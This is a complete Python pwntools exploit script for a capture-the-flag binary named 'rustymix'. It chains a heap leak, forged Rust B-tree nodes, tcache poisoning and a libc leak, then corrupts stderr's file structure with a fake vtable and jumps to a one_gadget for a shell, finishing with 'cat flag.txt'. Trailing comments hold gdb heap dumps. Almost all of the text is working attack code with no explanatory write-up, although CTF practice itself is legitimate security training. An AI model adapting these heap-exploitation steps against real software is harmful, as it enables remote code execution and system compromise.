#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF('./rustymix', checksec=False)
libc = ELF("./libc.so.6")
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'flu.xxx'
	port = int(args.PORT or 10130)
	if args.GDB:
		return gdb.debug([exe.path] + argv, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		kw.pop('gdbscript')
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''
dir ./src
dir ./src/rust
dir /home/rivit/workspace/github/glibc/
set substitute-path '/rustc/d5c2e9c342b358556da91d61ed4133f6f50fc0c3' './src/rust'
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {'RUST_BACKTRACE':'full'}

io = get_conn(env=env, gdbscript=gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
li = lambda *a, **k: log.info(*a, **k)
ls = lambda *a, **k: log.success(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr



def create(type):
	li(f'create({type})')
	sla(b'> ', b"1")
	sla(b'> ', str(type).encode())
	ru(b'handle: ')
	handle = rl().strip()
	li(f'handle: {handle}')
	return int(handle.decode())

def put(h,k,v):
	li(f'put({h},{k:#x},{v:#x})')
	sla(b'> ', b"2")
	sla(b'> ', str(h).encode())
	sla(b'> ', str(k).encode())
	sla(b'> ', str(v).encode())

def fetch(h, k):
	li(f'fetch({h},{k:#x})')
	sla(b'> ', b"3")
	sla(b'> ', str(h).encode())
	sla(b'> ', str(k).encode())

def show(h):
	li(f'fetch({h})')
	sla(b'> ', b"4")
	sla(b'> ', str(h).encode())
	ru(b'Value: ')
	res = int(rl().strip().decode())
	li(f'show({h}) -> {res:#x}')
	return res

def exit():
	sla(b'> ', b"5")


# pwndbg> p uh
# $1 = {0, 2, 3, 8, 9, 10, 10, 10, 10, 10}


# pause()
h0 = create(1)
h1 = create(1)
for i in range(2):
	put(h1,0x13371337+i, ord('0')+i)
h2 = create(1)
put(h2,0x133777, ord('2'))
h3 = create(1)
h4 = create(1)


lower = show(h3)
upper = show(h4)
heap_leak = upper << 32 | lower
heap_base = (heap_leak >> 12) << 12
ls(f'heap_leak: {heap_leak:#x}')
ls(f'heap_base: {heap_base:#x}')

fake_btree_map = heap_base + 0x5d0
ls(f'fake_btree_map: {fake_btree_map:#x}')

fake_node = heap_base + 0x10 
ls(f'fake_node: {fake_node:#x}')

# 3,4 allow to create addr of fake map
put(h3,0x1337, fake_btree_map & 0xFFFFFFFF)
put(h4,0x1337, (fake_btree_map >> 32) & 0xFFFFFFFF)
fetch(h3, 0x1337)
# fetch(h4, 0x1337) # not needed


# craft fake root node addr 
put(h0,0xdeadbeef+3, (fake_node >> 32) & 0xFFFFFFFF)
put(h0,0xdeadbeef, 0)
put(h0,0xdeadbeef+1, fake_node & 0xFFFFFFFF)


put(h3,0x13381338, 0xbaadbeef)
put(h3,0x700, 0xbaadbeef)
put(h3,0x888, 0xbaadbeef)
put(h3,0x99999999, 0xbaadbeef)

# tcachebins[0x70] size is 15 now
put(h4, 0xf << 16, 0)


# loop tcache to itself lel
fake_node = heap_base + 0xb0 - 0x30
ls(f'fake_node: {fake_node:#x}')
put(h0,0xdeadbeef+3, (fake_node >> 32) & 0xFFFFFFFF)
put(h0,0xdeadbeef+1, fake_node & 0xFFFFFFFF)

put(h4,0xdeadbeef+3, (fake_node >> 32) & 0xFFFFFFFF)
put(h4,0xdeadbeef, 0)
put(h4,0xdeadbeef+1, fake_node & 0xFFFFFFFF)


fake_node = heap_base + 0x475 # 0x476 leaks 6high bytes of libc addr
ls(f'fake_node: {fake_node:#x}')

# craft fake root node addr
put(h0,0xdeadbeef+1, fake_node & 0xFFFFFFFF)
put(h0,0xdeadbeef+3, (fake_node >> 32) & 0xFFFFFFFF)


# check lower 3 bytes on remote? CHECKED = 0x600
# [+] libc_leak_mid: 0x96460000
# [+] libc_leak_mid: 0xcfc60000

# leak marked part -  0x00007f >0062a166< 00 
fetch(4, 0) 
libc_leak_mid = show(4)
ls(f'libc_leak_mid: {libc_leak_mid:#x}')
leak_libc = libc_leak_mid << 8
leak_libc |= 0x7f << (5*8) # assume 5th byte 0x7f
ls(f'leak_libc: {leak_libc:#x}')
libc_base = leak_libc - 0x216600
ls(f'libc_base: {libc_base:#x}')
libc.address = libc_base


fake_node = libc_base + 0x21a6a0 + 0xa0 # stderr
li(f'fake_node: {fake_node:#x}')

# now we want to allocate from tcache
# fill up previous node so new one can be allocated
mapping = {}
for i in range(14):
	put(h2, 0xf0ffffff-i, 0xaaaaa+i)
	mapping[0xaaaaa+i] = 0xf0ffffff-i

# craft fake_node addr 
put(h2, mapping[0x000aaaad], (fake_node >> 32) & 0xFFFFFFFF)
put(h2, mapping[0x000aaaae], fake_node & 0xFFFFFFFF)

gadgets = list('330311 330323 330344 330352 527299 527312 527317 527322 965761 965765 965768 1104818 1104826 1104831 1104841'.split(' '))
gadgets = list(map(int, gadgets))
one_gadget = libc_base + gadgets[int(args.X or 9)]
# one_gadget = libc_base + gadgets[0]
li(f'one_gadget: {one_gadget:#x}')

put(h2, mapping[0x000aaaab], (one_gadget >> 32) & 0xFFFFFFFF)
put(h2, mapping[0x000aaaac], one_gadget & 0xFFFFFFFF)

fake_jumps = libc.sym['_IO_wfile_jumps']
li(f'fake_jumps: {fake_jumps:#x}')

# now we want to allocate from tcache
# fill up previous node so new one can be allocated
patches = { 
	8: fake_jumps & 0xFFFFFFFF,
	9: (fake_jumps >> 32) & 0xFFFFFFFF,
	6: 0
}

for i in range(10):
	put(h1, i+0x100, patches.get(i, 0x2220+i))


fake_node = heap_base + 0x7c0
fake_node = heap_base + 0x780

li(f'fake_node: {fake_node:#x}')
put(h2, mapping[0x000aaaad], (fake_node >> 32) & 0xFFFFFFFF)
put(h2, mapping[0x000aaaae], fake_node & 0xFFFFFFFF)

for i in range(9):
	put(h0, i+0x200, 0x333330)


fake_node = libc_base + 0x21a6a0 - 0x10
li(f'fake_node: {fake_node:#x}')
put(h2, mapping[0x000aaaad], (fake_node >> 32) & 0xFFFFFFFF)
put(h2, mapping[0x000aaaae], fake_node & 0xFFFFFFFF)

for i in range(8):
	put(h3, i+0x400, 0x333330)


fake_jumps = heap_base + 0xc0
fake_jumps -= 13 * 8 # we want to have  JUMP_INIT(doallocate, _IO_wfile_doallocate) there so need to offset a bit
li(f'fake_jumps: {fake_jumps:#x}')

put(h0,0xdeadbeef+1, fake_jumps & 0xFFFFFFFF)
put(h0,0xdeadbeef+3, (fake_jumps >> 32) & 0xFFFFFFFF)

exit()

sl(b'cat flag.txt')

ia()


# btree
# 0x556476e132d0	0x0000000000000000	0x0000000000000041	........A.......
# 0x556476e132e0	0x0000000000000000	0x0000556476e13320	........ 3.vdU..
# 0x556476e132f0	0x0000000000000000	0x0000000000000002	................
# 0x556476e13300	0x0000556475b7a080	0x00007f287e9f3600	...udU...6.~(...


#                          parent         uint32 keys[11]
# 0x556476e13320	0x0000000000000000	0x0000133800001337	........7...8...
# 0x556476e13330	0x0000000000000000	0x0000000000000000	................
# 0x556476e13340	0x0000000000000000	0x0000000000000000	................

# uint32 vals[11]
# 0x556476e13350	0x0000003000000000	0x0000000000000031	....0...1.......
# 0x556476e13360	0x0000000000000000	0x0000000000000000	................
# 0x556476e13370	0x0000000000000000	0x0000000000000000	................

# 0x556476e13380	0x0000000000020000	0x0000000000020c81	................
#              entries num (u16) ^            ^ top chunk




